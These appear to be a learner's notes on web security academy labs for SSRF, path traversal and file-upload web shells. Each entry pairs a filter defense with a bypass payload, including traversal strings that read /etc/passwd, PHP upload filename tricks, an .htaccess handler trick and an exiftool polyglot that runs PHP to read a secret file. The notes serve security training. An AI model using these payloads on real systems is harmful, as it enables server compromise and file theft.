# Server-side request forgery (SSRF) attacks

## Lab: SSRF with blacklist-based input filter
The application check the appearence of "admin"(all lowercase), so use "Admin" or something like that.


## Lab: SSRF with filter bypass via open redirection vulnerability

open redirection: `/product/nextProduct?currentProductId=10&path=/product?productId=11`  
Set the path to `http://192.168.0.12:8080/admin`, so `encodeURIComponent("/product/nextProduct?currentProductId=10&path=http://192.168.0.12:8080/admin)`


## Lab: File path traversal, traversal sequences blocked with absolute path bypass

Defense: limit relative path traversal

Bypass: ` /image?filename=/etc/passwd`, absolute patho


## Lab: File path traversal, traversal sequences stripped non-recursively

Defense: strips path traversal sequences, non-recursively

Bypass: `....//....//....//etc/passwd`


## Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

Bypass: double encode path `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`

## Lab: File path traversal, validation of start of path
Bypass: `filename=/var/www/images/../../../etc/passwd`


## Lab: File path traversal, validation of file extension with null byte bypass
`filename=../../../etc/passwd%00.png`

## Lab: Web shell upload via path traversal

Defense: restrict running of files in **specific** directories.

Bypass:  
1. Change the filename of updated file, add a path component '../'(encoded) `Content-Disposition: form-data; name="avatar"; filename="..%2Ftest.php"`
2. Visit the correct file path.

## Lab: Web shell upload via extension blacklist bypass

Defense: Blacklist possible file types, like .PHP

Bypass: Add a server configuration file to extent execuable file type.  
1. Create a file called `.htaccess`, content: `AddType application/x-httpd-php .hello`
2. Change the php file sufix to `.hello` and upload.
3. Request to the `.hello` file.

## Lab: Web shell upload via obfuscated file extension

Defense: Whitelist jpg and png

Bypass: `filename="test.php%00.jpg"`



## Lab: Remote code execution via polyglot web shell upload

Defense: Check the file content

Bypass: Forge a mixed, half-real polyglot file:
`exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php`

